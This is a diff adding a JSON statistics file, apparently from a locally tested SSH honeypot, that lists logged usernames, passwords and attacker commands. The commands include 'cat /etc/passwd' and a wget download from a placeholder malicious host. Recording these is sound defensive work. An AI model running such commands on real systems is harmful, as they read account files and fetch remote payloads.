@@ -1,0 +1,84 @@
+{
+    "total_events": 113,
+    "unique_sessions": 5,
+    "top_attacker_ips": [
+        [
+            "127.0.0.1",
+            6
+        ]
+    ],
+    "top_usernames": [
+        [
+            "root",
+            3
+        ],
+        [
+            "admin",
+            3
+        ]
+    ],
+    "top_passwords": [
+        [
+            "hacker245",
+            1
+        ],
+        [
+            "qwert",
+            1
+        ],
+        [
+            "thsis4uonl@smfo",
+            1
+        ],
+        [
+            "this is only fier su ",
+            1
+        ],
+        [
+            "\u001b[Ashuye576",
+            1
+        ]
+    ],
+    "top_commands": [
+        [
+            "ls",
+            4
+        ],
+        [
+            "pwd",
+            4
+        ],
+        [
+            "uname -a",
+            4
+        ],
+        [
+            "cat /etc/passwd",
+            4
+        ],
+        [
+            "wget http://malicious.com/file.sh",
+            4
+        ],
+        [
+            "hdiom254@yuo",
+            2
+        ],
+        [
+            "you know me .@54",
+            2
+        ],
+        [
+            "are you watching me @545484",
+            2
+        ],
+        [
+            "tsis4uol5@587",
+            2
+        ],
+        [
+            "@35nd26478",
+            2
+        ]
+    ]
+}
